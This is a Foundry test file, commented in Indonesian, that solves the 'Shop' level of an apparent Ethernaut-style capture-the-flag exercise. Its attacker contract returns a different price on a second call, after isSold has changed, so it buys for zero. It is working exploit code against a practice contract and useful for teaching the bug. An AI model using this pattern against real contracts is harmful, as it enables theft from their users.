// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Shop} from "src/levels/Shop.sol";
import {ShopFactory} from "src/levels/ShopFactory.sol";

// buy() memanggil _buyer.price() DUA kali: sekali di kondisi if, sekali
// untuk menetapkan price. price() tidak bisa mengubah state (view), tapi
// bisa MEMBACA state Shop: panggilan pertama isSold == false -> 100,
// panggilan kedua isSold == true (sudah diubah di antaranya) -> 0.
contract ShopBuyer {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function attack() external {
        shop.buy();
    }
}

contract ShopSolve is Test {
    ShopFactory factory;
    Shop instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new ShopFactory();
        instance = Shop(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        ShopBuyer buyer = new ShopBuyer(address(instance));
        buyer.attack();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
